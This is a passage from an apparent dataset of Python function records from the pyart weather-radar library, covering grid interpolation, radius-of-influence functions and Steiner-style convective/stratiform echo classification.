        parameter fields. Each elements is a `grid_size` float64 array
        containing the interpolated grid for that field.

    See Also
    --------
    grid_from_radars : Map to grid and return a Grid object.

    """"""
    if isinstance(radars, Radar):
        radars = (radars,)
    if len(radars) == 0:
        raise ValueError('Length of radars tuple cannot be zero')
    skip_transform = False
    if len(radars) == 1 and grid_origin_alt is None and (grid_origin is None):
        skip_transform = True
    if isinstance(gatefilters, GateFilter):
        gatefilters = (gatefilters,)
    if gatefilters is False:
        gatefilters = (False,) * len(radars)
    if gatefilters is None:
        gatefilters = (None,) * len(radars)
    if len(gatefilters) != len(radars):
        raise ValueError('Length of gatefilters must match length of radars')
    if weighting_function.upper() not in ['CRESSMAN', 'BARNES2', 'BARNES', 'NEAREST']:
        raise ValueError('unknown weighting_function')
    if algorithm not in ['kd_tree']:
        raise ValueError('unknown algorithm: %s' % algorithm)
    badval = get_fillvalue()
    if grid_projection is None:
        grid_projection = {'proj': 'pyart_aeqd', '_include_lon_0_lat_0': True}
    if grid_origin is None:
        try:
            lat = float(radars[0].latitude['data'])
            lon = float(radars[0].longitude['data'])
        except TypeError:
            lat = np.mean(radars[0].latitude['data'])
            lon = np.mean(radars[0].longitude['data'])
        grid_origin = (lat, lon)
    (grid_origin_lat, grid_origin_lon) = grid_origin
    if grid_origin_alt is None:
        try:
            grid_origin_alt = float(radars[0].altitude['data'])
        except TypeError:
            grid_origin_alt = np.mean(radars[0].altitude['data'])
    if fields is None:
        fields = set(radars[0].fields.keys())
        for radar in radars[1:]:
            fields = fields.intersection(radar.fields.keys())
        fields = list(fields)
    nfields = len(fields)
    nradars = len(radars)
    ngates_per_radar = [r.fields[fields[0]]['data'].size for r in radars]
    total_gates = np.sum(ngates_per_radar)
    gate_offset = np.cumsum([0] + ngates_per_radar)
    gate_locations = np.ma.empty((total_gates, 3), dtype=np.float64)
    include_gate = np.ones(total_gates, dtype=np.bool_)
    offsets = []
    if copy_field_data:
        field_data = np.ma.empty((total_gates, nfields), dtype=np.float64)
    else:
        field_data_objs = np.empty((nfields, nradars), dtype='object')
        filtered_gates_per_radar = []
    projparams = grid_projection.copy()
    if projparams.pop('_include_lon_0_lat_0', False):
        projparams['lon_0'] = grid_origin_lon
        projparams['lat_0'] = grid_origin_lat
    for (iradar, (radar, gatefilter)) in enumerate(zip(radars, gatefilters)):
        (x_disp, y_disp) = geographic_to_cartesian(radar.longitude['data'], radar.latitude['data'], projparams)
        try:
            z_disp = float(radar.altitude['data']) - grid_origin_alt
            offsets.append((z_disp, float(y_disp), float(x_disp)))
        except TypeError:
            z_disp = np.mean(radar.altitude['data']) - grid_origin_alt
            offsets.append((z_disp, np.mean(y_disp), np.mean(x_disp)))
        if skip_transform:
            xg_loc = radar.gate_x['data']
            yg_loc = radar.gate_y['data']
        else:
            (xg_loc, yg_loc) = geographic_to_cartesian(radar.gate_longitude['data'], radar.gate_latitude['data'], projparams)
        zg_loc = radar.gate_altitude['data'] - grid_origin_alt
        (start, end) = (gate_offset[iradar], gate_offset[iradar + 1])
        gate_locations[start:end, 0] = zg_loc.flatten()
        gate_locations[start:end, 1] = yg_loc.flatten()
        gate_locations[start:end, 2] = xg_loc.flatten()
        del xg_loc, yg_loc
        gflags = zg_loc < toa
        if gatefilter is not False:
            if gatefilter is None:
                gatefilter = moment_based_gate_filter(radar, **kwargs)
            gflags = np.logical_and(gflags, gatefilter.gate_included)
        include_gate[start:end] = gflags.flatten()
        if not copy_field_data:
            filtered_gates_per_radar.append(gflags.sum())
        del gflags, zg_loc
        for (ifield, field) in enumerate(fields):
            flat_field_data = radar.fields[field]['data'].ravel()
            if copy_field_data:
                field_data[start:end, ifield] = flat_field_data
            else:
                field_data_objs[ifield, iradar] = flat_field_data
        del flat_field_data
    if copy_field_data:
        filtered_field_data = field_data[include_gate]
    else:
        lookup = np.where(include_gate)[0]
        filtered_gate_offset = np.cumsum([0] + filtered_gates_per_radar)
        for i in range(1, nradars):
            l_start = filtered_gate_offset[i]
            l_end = filtered_gate_offset[i + 1]
            gates_before = gate_offset[i]
            lookup[l_start:l_end] += total_gates * i - gates_before
    nnlocator = NNLocator(gate_locations[include_gate], algorithm=algorithm, leafsize=leafsize)
    (nz, ny, nx) = grid_shape
    (zr, yr, xr) = grid_limits
    (z_start, z_stop) = zr
    (y_start, y_stop) = yr
    (x_start, x_stop) = xr
    if nz == 1:
        z_step = 0.0
    else:
        z_step = (z_stop - z_start) / (nz - 1.0)
    if ny == 1:
        y_step = 0.0
    else:
        y_step = (y_stop - y_start) / (ny - 1.0)
    if nx == 1:
        x_step = 0.0
    else:
        x_step = (x_stop - x_start) / (nx - 1.0)
    if not hasattr(roi_func, '__call__'):
        if constant_roi is not None:
            roi_func = 'constant'
        else:
            constant_roi = 500.0
        if roi_func == 'constant':
            roi_func = _gen_roi_func_constant(constant_roi)
        elif roi_func == 'dist':
            roi_func = _gen_roi_func_dist(z_factor, xy_factor, min_radius, offsets)
        elif roi_func == 'dist_beam':
            roi_func = _gen_roi_func_dist_beam(h_factor, nb, bsp, min_radius, offsets)
        else:
            raise ValueError('unknown roi_func: %s' % roi_func)
    grid_data = np.ma.empty((nz, ny, nx, nfields), dtype=np.float64)
    grid_data.set_fill_value(badval)
    if map_roi:
        roi = np.empty((nz, ny, nx), dtype=np.float64)
    for (iz, iy, ix) in np.ndindex(nz, ny, nx):
        x = x_start + x_step * ix
        y = y_start + y_step * iy
        z = z_start + z_step * iz
        r = roi_func(z, y, x)
        if map_roi:
            roi[iz, iy, ix] = r
        (ind, dist) = nnlocator.find_neighbors_and_dists((z, y, x), r)
        if len(ind) == 0:
            grid_data[iz, iy, ix] = np.ma.masked
            grid_data.data[iz, iy, ix] = badval
            continue
        if copy_field_data:
            nn_field_data = filtered_field_data[ind]
        else:
            (r_nums, e_nums) = divmod(lookup[ind], total_gates)
            npoints = r_nums.size
            r_nums = r_nums.astype(np.intc)
            e_nums = e_nums.astype(np.intc)
            nn_field_data = np.empty((npoints, nfields), np.float64)
            _load_nn_field_data(field_data_objs, nfields, npoints, r_nums, e_nums, nn_field_data)
        dist2 = dist * dist
        r2 = r * r
        if weighting_function.upper() == 'NEAREST':
            value = nn_field_data[np.argmin(dist2)]
        else:
            if weighting_function.upper() == 'CRESSMAN':
                weights = (r2 - dist2) / (r2 + dist2)
            elif weighting_function.upper() == 'BARNES':
                warnings.warn('Barnes weighting function is deprecated. Please use Barnes 2 to be consistent with Pauley and Wu 1990. Default will be switched to Barnes2 on June 1st.', DeprecationWarning)
                weights = np.exp(-dist2 / (2.0 * r2)) + 1e-05
            elif weighting_function.upper() == 'BARNES2':
                weights = np.exp(-dist2 / (r2 / 4)) + 1e-05
            value = np.ma.average(nn_field_data, weights=weights, axis=0)
        grid_data[iz, iy, ix] = value
    grids = {f: grid_data[..., i] for (i, f) in enumerate(fields)}
    if map_roi:
        grids['ROI'] = roi
    return grids"
ARM-DOE/pyart,example_roi_func_constant,"def example_roi_func_constant(zg, yg, xg):
    """"""
    Example RoI function which returns a constant radius.

    Parameters
    ----------
    zg, yg, xg : float
        Distance from the grid center in meters for the x, y and z axes.

    Returns
    -------
    roi : float
        Radius of influence in meters
    """"""
    constant = 500.0
    return constant"
ARM-DOE/pyart,_gen_roi_func_constant,"def _gen_roi_func_constant(constant_roi):
    """"""
    Return a RoI function which returns a constant radius.

    See :py:func:`map_to_grid` for a description of the parameters.
    """"""

    def roi(zg, yg, xg):
        """"""constant radius of influence function.""""""
        return constant_roi
    return roi"
ARM-DOE/pyart,example_roi_func_dist,"def example_roi_func_dist(zg, yg, xg):
    """"""
    Example RoI function which returns a radius which grows with distance.

    Parameters
    ----------
    zg, yg, xg : float
        Distance from the grid center in meters for the x, y and z axes.

    Returns
    -------
    roi : float

    """"""
    z_factor = 0.05
    xy_factor = 0.02
    min_radius = 500.0
    offsets = ((0, 0, 0),)
    offsets = np.array(offsets)
    zg_off = offsets[:, 0]
    yg_off = offsets[:, 1]
    xg_off = offsets[:, 2]
    r = np.maximum(z_factor * (zg - zg_off) + xy_factor * np.sqrt((xg - xg_off) ** 2 + (yg - yg_off) ** 2), min_radius)
    return min(r)"
ARM-DOE/pyart,_gen_roi_func_dist,"def _gen_roi_func_dist(z_factor, xy_factor, min_radius, offsets):
    """"""
    Return a RoI function whose radius grows with distance.

    See :py:func:`map_to_grid` for a description of the parameters.
    """"""
    offsets = np.array(offsets)
    zg_off = offsets[:, 0]
    yg_off = offsets[:, 1]
    xg_off = offsets[:, 2]

    def roi(zg, yg, xg):
        """"""dist radius of influence function.""""""
        r = np.maximum(z_factor * (zg - zg_off) + xy_factor * np.sqrt((xg - xg_off) ** 2 + (yg - yg_off) ** 2), min_radius)
        return min(r)
    return roi"
ARM-DOE/pyart,example_roi_func_dist_beam,"def example_roi_func_dist_beam(zg, yg, xg):
    """"""
    Example RoI function which returns a radius which grows with distance
    and whose parameters are based on virtual beam size.

    Parameters
    ----------
    zg, yg, xg : float
        Distance from the grid center in meters for the x, y and z axes.

    Returns
    -------
    roi : float

    """"""
    h_factor = 1.0
    nb = 1.5
    bsp = 1.0
    min_radius = 500.0
    offsets = ((0, 0, 0),)
    offsets = np.array(offsets)
    zg_off = offsets[:, 0]
    yg_off = offsets[:, 1]
    xg_off = offsets[:, 2]
    r = np.maximum(h_factor * ((zg - zg_off) / 20.0) + np.sqrt((yg - yg_off) ** 2 + (xg - xg_off) ** 2) * np.tan(nb * bsp * np.pi / 180.0), min_radius)
    return min(r)"
ARM-DOE/pyart,_gen_roi_func_dist_beam,"def _gen_roi_func_dist_beam(h_factor, nb, bsp, min_radius, offsets):
    """"""
    Return a RoI function whose radius which grows with distance
    and whose parameters are based on virtual beam size.

    See :py:func:`map_to_grid` for a description of the parameters.
    """"""
    offsets = np.array(offsets)
    zg_off = offsets[:, 0]
    yg_off = offsets[:, 1]
    xg_off = offsets[:, 2]

    def roi(zg, yg, xg):
        """"""dist_beam radius of influence function.""""""
        r = np.maximum(h_factor * ((zg - zg_off) / 20.0) + np.sqrt((yg - yg_off) ** 2 + (xg - xg_off) ** 2) * np.tan(nb * bsp * np.pi / 180.0), min_radius)
        return min(r)
    return roi"
ARM-DOE/pyart,__init__,"def __init__(self, data, leafsize=10, algorithm='kd_tree'):
    """"""initalize.""""""
    self._algorithm = algorithm
    if algorithm == 'kd_tree':
        self.tree = cKDTree(data, leafsize=leafsize)
    else:
        raise ValueError('invalid algorithm')"
ARM-DOE/pyart,find_neighbors_and_dists,"def find_neighbors_and_dists(self, q, r):
    """"""
        Find all neighbors and distances within a given distance.

        Parameters
        ----------
        q : n_dimensional tuple
            Point to query
        r : float
            Distance within which neighbors are returned.

        Returns
        -------
        ind : array of intergers
            Indices of the neighbors.
        dist : array of floats
            Distances to the neighbors.

        """"""
    if self._algorithm == 'kd_tree':
        ind = self.tree.query_ball_point(q, r)
        if len(ind) == 0:
            return (ind, 0)
        dist = scipy.spatial.minkowski_distance(q, self.tree.data[ind])
        return (ind, dist)"
ARM-DOE/pyart,roi,"def roi(zg, yg, xg):
    """"""constant radius of influence function.""""""
    return constant_roi"
ARM-DOE/pyart,roi,"def roi(zg, yg, xg):
    """"""dist radius of influence function.""""""
    r = np.maximum(z_factor * (zg - zg_off) + xy_factor * np.sqrt((xg - xg_off) ** 2 + (yg - yg_off) ** 2), min_radius)
    return min(r)"
ARM-DOE/pyart,roi,"def roi(zg, yg, xg):
    """"""dist_beam radius of influence function.""""""
    r = np.maximum(h_factor * ((zg - zg_off) / 20.0) + np.sqrt((yg - yg_off) ** 2 + (xg - xg_off) ** 2) * np.tan(nb * bsp * np.pi / 180.0), min_radius)
    return min(r)"
ARM-DOE/pyart,_steiner_conv_strat,"def _steiner_conv_strat(refl, x, y, dx, dy, intense=42, peak_relation=0, area_relation=1, bkg_rad=11000, use_intense=True):
    """"""
    We perform the Steiner et al. (1995) algorithm for echo classification
    using only the reflectivity field in order to classify each grid point
    as either convective, stratiform or undefined. Grid points are
    classified as follows,

    0 = Undefined
    1 = Stratiform
    2 = Convective
    """"""

    def convective_radius(ze_bkg, area_relation):
        """"""
        Given a mean background reflectivity value, we determine via a step
        function what the corresponding convective radius would be.

        Higher background reflectivitives are expected to have larger
        convective influence on surrounding areas, so a larger convective
        radius would be prescribed.
        """"""
        if area_relation == 0:
            if ze_bkg < 30:
                conv_rad = 1000.0
            elif (ze_bkg >= 30) & (ze_bkg < 35.0):
                conv_rad = 2000.0
            elif (ze_bkg >= 35.0) & (ze_bkg < 40.0):
                conv_rad = 3000.0
            elif (ze_bkg >= 40.0) & (ze_bkg < 45.0):
                conv_rad = 4000.0
            else:
                conv_rad = 5000.0
        if area_relation == 1:
            if ze_bkg < 25:
                conv_rad = 1000.0
            elif (ze_bkg >= 25) & (ze_bkg < 30.0):
                conv_rad = 2000.0
            elif (ze_bkg >= 30.0) & (ze_bkg < 35.0):
                conv_rad = 3000.0
            elif (ze_bkg >= 35.0) & (ze_bkg < 40.0):
                conv_rad = 4000.0
            else:
                conv_rad = 5000.0
        if area_relation == 2:
            if ze_bkg < 20:
                conv_rad = 1000.0
            elif (ze_bkg >= 20) & (ze_bkg < 25.0):
                conv_rad = 2000.0
            elif (ze_bkg >= 25.0) & (ze_bkg < 30.0):
                conv_rad = 3000.0
            elif (ze_bkg >= 30.0) & (ze_bkg < 35.0):
                conv_rad = 4000.0
            else:
                conv_rad = 5000.0
        if area_relation == 3:
            if ze_bkg < 40:
                conv_rad = 0.0
            elif (ze_bkg >= 40) & (ze_bkg < 45.0):
                conv_rad = 1000.0
            elif (ze_bkg >= 45.0) & (ze_bkg < 50.0):
                conv_rad = 2000.0
            elif (ze_bkg >= 50.0) & (ze_bkg < 55.0):
                conv_rad = 6000.0
            else:
                conv_rad = 8000.0
        return conv_rad

    def peakedness(ze_bkg, peak_relation):
        """"""
        Given a background reflectivity value, we determine what the necessary
        peakedness (or difference) has to be between a grid point's
        reflectivity and the background reflectivity in order for that grid
        point to be labeled convective.
        """"""
        if peak_relation == 0:
            if ze_bkg < 0.0:
                peak = 10.0
            elif ze_bkg >= 0.0 and ze_bkg < 42.43:
                peak = 10.0 - ze_bkg ** 2 / 180.0
            else:
                peak = 0.0
        elif peak_relation == 1:
            if ze_bkg < 0.0:
                peak = 14.0
            elif ze_bkg >= 0.0 and ze_bkg < 42.43:
                peak = 14.0 - ze_bkg ** 2 / 180.0
            else:
                peak = 4.0
        return peak
    sclass = np.zeros(refl.shape, dtype=int)
    (ny, nx) = refl.shape
    for i in range(0, nx):
        imin = np.max(np.array([1, i - bkg_rad / dx], dtype=int))
        imax = np.min(np.array([nx, i + bkg_rad / dx], dtype=int))
        for j in range(0, ny):
            if ~np.isnan(refl[j, i]) & (sclass[j, i] == 0):
                jmin = np.max(np.array([1, j - bkg_rad / dy], dtype=int))
                jmax = np.min(np.array([ny, j + bkg_rad / dy], dtype=int))
                n = 0
                sum_ze = 0
                for r in range(imin, imax):
                    for m in range(jmin, jmax):
                        if not np.isnan(refl[m, r]):
                            rad = np.sqrt((x[r] - x[i]) ** 2 + (y[m] - y[j]) ** 2)
                            if rad <= bkg_rad:
                                n += 1
                                sum_ze += 10.0 ** (refl[m, r] / 10.0)
                if n == 0:
                    ze_bkg = np.inf
                else:
                    ze_bkg = 10.0 * np.log10(sum_ze / n)
                conv_rad = convective_radius(ze_bkg, area_relation)
                lmin = np.max(np.array([1, int(i - conv_rad / dx)], dtype=int))
                lmax = np.min(np.array([nx, int(i + conv_rad / dx)], dtype=int))
                mmin = np.max(np.array([1, int(j - conv_rad / dy)], dtype=int))
                mmax = np.min(np.array([ny, int(j + conv_rad / dy)], dtype=int))
                if use_intense and refl[j, i] >= intense:
                    sclass[j, i] = 2
                    for r in range(lmin, lmax):
                        for m in range(mmin, mmax):
                            if not np.isnan(refl[m, r]):
                                rad = np.sqrt((x[r] - x[i]) ** 2 + (y[m] - y[j]) ** 2)
                                if rad <= conv_rad:
                                    sclass[m, r] = 2
                else:
                    peak = peakedness(ze_bkg, peak_relation)
                    if refl[j, i] - ze_bkg >= peak:
                        sclass[j, i] = 2
                        for r in range(imin, imax):
                            for m in range(jmin, jmax):
                                if not np.isnan(refl[m, r]):
                                    rad = np.sqrt((x[r] - x[i]) ** 2 + (y[m] - y[j]) ** 2)
                                    if rad <= conv_rad:
                                        sclass[m, r] = 2
                    else:
                        sclass[j, i] = 1
    return sclass"
ARM-DOE/pyart,steiner_class_buff,"def steiner_class_buff(ze, x, y, z, dx, dy, bkg_rad, work_level, intense, peak_relation, area_relation, use_intense):
    zslice = np.argmin(np.abs(z - work_level))
    refl = ze[zslice, :, :]
    area_rel = {'small': 0, 'medium': 1, 'large': 2, 'sgp': 3}
    peak_rel = {'default': 0, 'sgp': 1}
    sclass = _steiner_conv_strat(refl, x, y, dx, dy, intense=intense, peak_relation=peak_rel[peak_relation], area_relation=area_rel[area_relation], bkg_rad=11000, use_intense=True)
    return sclass"
ARM-DOE/pyart,_feature_detection,"def _feature_detection(field, dx, dy, always_core_thres=42, bkg_rad_km=11, use_cosine=True, max_diff=5, zero_diff_cos_val=55, scalar_diff=1.5, use_addition=True, calc_thres=0.75, weak_echo_thres=5.0, min_val_used=5.0, dB_averaging=True, remove_small_objects=True, min_km2_size=10, binary_close=False, val_for_max_rad=30, max_rad_km=5.0, core_val=3, nosfcecho=0, weakecho=3, bkgd_val=1, feat_val=2):
    """"""
    These functions are used to detect features in fields based on how distinct they are from the background
    average. Methodology described in Tomkins et al. (2023), originally based on convective-stratiform algorithms
    developed by Steiner et al. (1995), Yuter and Houze (1997), and Yuter et al. (2005) Grid points are
    classified as follows,

    nosfcecho = No Surface Echo/ Undefined
    bkgd_val = Background echo (e.g. Stratiform)
    feat_val = Feature (e.g. Convective)
    weakecho = Weak Echo

    field : array
        array of values to find features
    x, y : array
        x and y coordinates of field array, respectively
    dx, dy : float
        The x- and y-dimension resolutions in meters, respectively.
    always_core_thres : float, optional
        Threshold for points that are always features. All values above the threshold are classified as features.
    bkg_rad_km : float, optional
        Radius to compute background field in kilometers. Default is 11 km. Recommended to be at least 3 x grid spacing
    use_cosine : bool, optional
        Boolean used to determine if a cosine scheme (see Yuter and Houze (1997)) should be used for identifying
        cores (True) or if a simpler scalar scheme (False) should be used.
    max_diff : float, optional
        Maximum difference between background average and grid value in order to be classified as features.
        ""a"" value in Eqn. B1 in Yuter and Houze (1997)
    zero_diff_cos_val : float, optional
        Value where difference between background average and grid value is zero in the cosine function
        ""b"" value in Eqn. B1 in Yuter and Houze (1997)
    scalar_diff : float, optional
        If using a scalar difference scheme, this value is the multiplier or addition to the background average
    use_addition : bool, optional
        Determines if a multiplier (False) or addition (True) in the scalar difference scheme should be used
    calc_thres : float, optional
        Minimum percentage of points needed to be considered in background average calculation
    weak_echo_thres : float, optional
        Threshold for determining weak echo. All values below this threshold will be considered weak echo
    min_val_used : float, optional
        Minimum value used for classification. All values below this threshold will be considered no surface echo
        See Yuter and Houze (1997) and Yuter et al. (2005) for more detail. Units based on input field
    dB_averaging : bool, optional
        True if using dBZ values that need to be converted to linear Z before averaging. False for other types of values
    remove_small_objects : bool, optional
        Determines if small objects should be removed from core array. Default is True.
    min_km2_size : float, optional
        Minimum size of Cores to be considered. Cores less than this size will be removed. Default is 10 km^2.
    binary_close : bool, optional
        Determines if a binary closing should be performed on the cores. Default is False.
    val_for_max_rad : float, optional
        value used for maximum radius. Cores with values above this will have the maximum radius incorporated.
    max_rad_km : float, optional
        Maximum radius around cores to classify as feature. Default is 5 km
    core_val : int, optional
        Value for points classified as cores
    nosfcecho : int, optional
        Value for points classified as no surface echo, based on min_val_used
    weakecho : int, optional
        Value for points classified as weak echo, based on weak_echo_thres.
    bkgd_val : int, optional
        Value for points classified as background echo.
    feat_val : int, optional
        Value for points classified as features.

    Returns
    -------
    field_bkg : array
        Array of background values
    core_array : array
        Array of initial cores (identified features without radii applied)
    feature_array : array
        Array of feature detection with radii applied
    """"""
    max_diameter = int(np.floor(max_rad_km / (dx / 1000) * 2))
    if max_diameter % 2 == 0:
        max_diameter = max_diameter + 1
    center_mask_x = int(np.floor(max_diameter / 2))
    bkg_diameter_pix = int(np.floor(bkg_rad_km / (dx / 1000) * 2))
    if bkg_diameter_pix % 2 == 0:
        bkg_diameter_pix = bkg_diameter_pix + 1
    bkg_center = int(np.floor(bkg_diameter_pix / 2))
    bkg_mask_array = np.ones((bkg_diameter_pix, bkg_diameter_pix), dtype=float)
    bkg_mask_array = create_radial_mask(bkg_mask_array, min_rad_km=0, max_rad_km=bkg_rad_km, x_pixsize=dx / 1000, y_pixsize=dy / 1000, center_x=bkg_center, center_y=bkg_center, circular=True)
    field = np.ma.masked_invalid(field)
    field_bkg = calc_bkg_intensity(field, bkg_mask_array, dB_averaging, calc_thres)
    if use_cosine:
        core_array = core_cos_scheme(field, field_bkg, max_diff, zero_diff_cos_val, always_core_thres, core_val)
    else:
        core_array = core_scalar_scheme(field, field_bkg, scalar_diff, always_core_thres, core_val, use_addition=use_addition)
    radius_array_km = assign_feature_radius_km(field_bkg, val_for_max_rad=val_for_max_rad, max_rad=max_rad_km)
    if remove_small_objects:
        min_pix_size = min_km2_size / (dx / 1000 * (dy / 1000))
        (cc_labels, _) = scipy.ndimage.label(core_array)
        cc_labels = np.ma.masked_where(core_array.mask, cc_labels)
        for lab in np.unique(cc_labels):
            size_lab = np.count_nonzero(cc_labels == lab)
            if size_lab < min_pix_size:
                core_array[cc_labels == lab] = 0
    if binary_close:
        close_core = scipy.ndimage.binary_closing(core_array).astype(int)
        core_array = close_core * core_val
    temp_assignment = np.zeros_like(core_array)
    for radius in np.arange(1, max_rad_km + 1):
        radius_mask_array = create_radius_mask(max_diameter, radius, dx / 1000, dy / 1000, center_mask_x)
        temp = radius_array_km == radius
        temp_core = np.ma.masked_where(~temp, core_array)
        temp_dilated = scipy.ndimage.binary_dilation(temp_core.filled(0), radius_mask_array)
        temp_assignment = temp_assignment + temp_dilated
    core_copy = np.ma.copy(core_array)
    core_copy[temp_assignment >= 1] = core_val
    feature_array = np.zeros_like(field)
    feature_array = classify_feature_array(field, feature_array, core_copy, nosfcecho, feat_val, bkgd_val, weakecho, core_val, min_val_used, weak_echo_thres)
    feature_array = np.ma.masked_where(field.mask, feature_array)
    return (field_bkg, core_array, feature_array)"
ARM-DOE/pyart,create_radial_mask,"def create_radial_mask(mask_array, min_rad_km, max_rad_km, x_pixsize, y_pixsize, center_x, center_y, circular=True):
    """"""
    Computes a radial distance mask, everything with distance between minradiuskm
    and maxradiuskm is assigned 1, everything else is assigned 0. This version can
    handle rectangular arrays and pixels as well as square ones.

    Parameters
    ----------
    mask_array : array
        Array to mask
    min_rad_km, max_rad_km : float
        The minimum and maximum radius of the non-masked region in kilometers.
    x_pixsize, y_pixsize : float
        The pixel size in the x- and y-dimension in kilometers, respectively
    center_x, center_y : int
        The center pixel in the x- and y-dimension, respectively
    circular : bool
        True returns circular mask, False returns a rectangular mask.

    Returns
    -------
    mask_array : array
        Rectangular array masked by a radial distance.
    """"""
    (xsize, ysize) = mask_array.shape
    for j in np.arange(0, ysize, 1):
        for i in np.arange(0, xsize, 1):
            if circular:
                x_range_sq = ((center_x - i) * x_pixsize) ** 2
                y_range_sq = ((center_y - j) * y_pixsize) ** 2
                circ_range = np.sqrt(x_range_sq + y_range_sq)
            else:
                x_range = abs(int(np.floor(center_x - i) * x_pixsize))
                y_range = abs(int(np.floor(center_y - j) * y_pixsize))
                if x_range > y_range:
                    circ_range = x_range
                else:
                    circ_range = y_range
            if circ_range <= max_rad_km and circ_range >= min_rad_km:
                mask_array[j, i] = 1
            else:
                mask_array[j, i] = 0
    return mask_array"
ARM-DOE/pyart,calc_bkg_intensity,"def calc_bkg_intensity(field, bkg_mask_array, dB_averaging, calc_thres=None):
    """"""
    Calculate the background of the given field. The footprint used to
    calculate the average for each pixel is given by bkg_mask_array

    Parameters
    ----------
    field : array
        Field array to compute average
    bkg_mask_array : array
        Array of radial points to use for average
    dB_averaging : bool
        If True, converts dBZ to linear Z before averaging
    calc_thres : float
        Minimum percentage of points needed to be considered in background average calculation

    Returns
    -------
    field_bkg : array
        Array of average values
    """"""
    if dB_averaging:
        field = 10 ** (field / 10)
    field_bkg = scipy.ndimage.generic_filter(field.filled(np.nan), function=np.nanmean, mode='constant', footprint=bkg_mask_array.astype(bool), cval=np.nan)
    if calc_thres is not None:
        field_count = scipy.ndimage.generic_filter(field.filled(0), function=np.count_nonzero, mode='constant', footprint=bkg_mask_array.astype(bool), cval=0)
        val = calc_thres * np.count_nonzero(bkg_mask_array)
        field_bkg = np.ma.masked_where(field_count < val, field_bkg)
    field_bkg = np.ma.masked_where(field.mask, field_bkg)
    if dB_averaging:
        field_bkg = 10 * np.log10(field_bkg)
        field_bkg = np.ma.masked_where(field.mask, field_bkg)
    return field_bkg"
ARM-DOE/pyart,core_cos_scheme,"def core_cos_scheme(field, field_bkg, max_diff, zero_diff_cos_val, always_core_thres, CS_CORE):
    """"""
    Function for assigning cores based on a cosine function

    Parameters
    ----------
    field : array
        Field values
    field_bkg : array
        Background average of field values
    max_diff : float
        Maximum difference between field and field_bkg needed for feature detection
    zero_diff_cos_val : float
        Value where the cosine function returns a zero difference
    always_core_thres : float
        All values above this threshold considered to be features
    CS_CORE : int
        Value assigned to features

    Returns
    -------
    core_array : array
        Array of booleans if point is feature (1) or not (0)
    """"""
    core_array = np.zeros_like(field)
    zDiff = max_diff * np.cos(np.pi * field_bkg / (2 * zero_diff_cos_val))
    zDiff[zDiff < 0] = 0
    zDiff[field_bkg < 0] = max_diff
    core_elements = np.logical_or(field >= always_core_thres, field - field_bkg >= zDiff)
    core_elements = core_elements.filled(0)
    core_array[core_elements] = CS_CORE
    core_array = np.ma.masked_where(field.mask, core_array)
    return core_array"
ARM-DOE/pyart,core_scalar_scheme,"def core_scalar_scheme(field, field_bkg, max_diff, always_core_thres, CORE, use_addition=False):
    """"""
    Function for assigning cores based on a scalar difference

    Parameters
    ----------
    field : array
        Field values
    field_bkg : array
        Background average of field values
    max_diff : float
        Maximum difference between field and field_bkg needed for feature detection
    always_core_thres : float
        All values above this threshold considered to be a feature
    CORE : int
        Value assigned to features
    use_addition : bool
        Boolean to determine if scalar should be added (True) or multiplied (False)

    Returns
    -------
    core_array : array
        Array of booleans if point is feature (1) or not (0)
    """"""
    core_array = np.zeros_like(field)
    if use_addition:
        zDiff = max_diff + field_bkg - field_bkg
    else:
        zDiff = max_diff * field_bkg - field_bkg
    zDiff[zDiff < 0] = 0
    zDiff[field_bkg < 0] = 0
    core_elements = np.logical_or(field >= always_core_thres, field - field_bkg >= zDiff)
    core_elements = core_elements.filled(0)
    core_array[core_elements] = CORE
    core_array = np.ma.masked_where(field.mask, core_array)
    return core_array"
ARM-DOE/pyart,create_radius_mask,"def create_radius_mask(max_diameter, radius_km, x_spacing, y_spacing, center_mask_x):
    """"""
    Creates a circular mask based on input diameter

    Parameters
    ----------
    max_diameter : int
        maximum diameter in kilometers
    radius_km : int
        radius in kilometers
    x_spacing, y_spacing : float
        x- and y-dimension pixel size in meters, respectively
    center_mask_x : int
        index of center point

    Returns
    -------
    feature_mask_array : array
        array masked based on distance of diameter to incorporate
    """"""
    feature_mask_array = np.zeros((max_diameter, max_diameter))
    feature_mask_array = create_radial_mask(feature_mask_array, 0, radius_km, x_spacing, y_spacing, center_mask_x, center_mask_x, True)
    return feature_mask_array"
ARM-DOE/pyart,assign_feature_radius_km,"def assign_feature_radius_km(field_bkg, val_for_max_rad, max_rad=5):
    """"""
    Assigns the radius in kilometers based on the background values

    Parameters
    ----------
    field_bkg : array
        array of background field values
    val_for_max_rad : float
        field value for maximum radius (5 km)
    max_rad : float, optional
        maximum radius in kilometers

    Returns
    -------
    radius_array_km : array
        array of radii based on background values and val for max. radius
    """"""
    radius_array_km = np.ones_like(field_bkg)
    radius_array_km[field_bkg >= val_for_max_rad - 15] = max_rad - 3
    radius_array_km[field_bkg >= val_for_max_rad - 10] = max_rad - 2
    radius_array_km[field_bkg >= val_for_max_rad - 5] = max_rad - 1
    radius_array_km[field_bkg >= val_for_max_rad] = max_rad
    return radius_array_km"
ARM-DOE/pyart,classify_feature_array,"def classify_feature_array(field, feature_array, core_array, NOSFCECHO, FEAT_VAL, BKGD_VAL, WEAKECHO, CORE, MINDBZUSE, WEAKECHOTHRES):
    """"""
    Does an initial feature detection

    Parameters
    ----------
    field : array
        Array of field values
    feature_array : array
        Array with feature detection
    core_array : array
        Array with cores
    NOSFCECHO : int
        Value to assign points classified as no surface echo
    FEAT_VAL : int
        Value to assign points classified as features
    BKGD_VAL : int
        Value to assign points classified as background echo
    WEAKECHO : int
        Value to assign points classfied as weak echo
    CORE : int
        Value assigned to cores in core_array
    MINDBZUSE : float
        Minimum dBZ value to consider in classification, all values below this will be set to NOSFCECHO
    WEAKECHOTHRES : float
        dBZ threshold for weak echo classification, all values below this will be set to WEAKECHO

    Returns
    -------
    feature_array : array
        array of classifications
    """"""
    feature_array[:] = BKGD_VAL
    feature_array[field.mask] = NOSFCECHO
    feature_array[core_array == CORE] = FEAT_VAL
    feature_array[field < WEAKECHOTHRES] = WEAKECHO
    feature_array[field < MINDBZUSE] = NOSFCECHO
    return feature_array"
ARM-DOE/pyart,convective_radius,"def convective_radius(ze_bkg, area_relation):
    """"""
        Given a mean background reflectivity value, we determine via a step
        function what the corresponding convective radius would be.

        Higher background reflectivitives are expected to have larger
        convective influence on surrounding areas, so a larger convective
        radius would be prescribed.
        """"""
    if area_relation == 0:
        if ze_bkg < 30:
            conv_rad = 1000.0
        elif (ze_bkg >= 30) & (ze_bkg < 35.0):
            conv_rad = 2000.0
        elif (ze_bkg >= 35.0) & (ze_bkg < 40.0):
            conv_rad = 3000.0
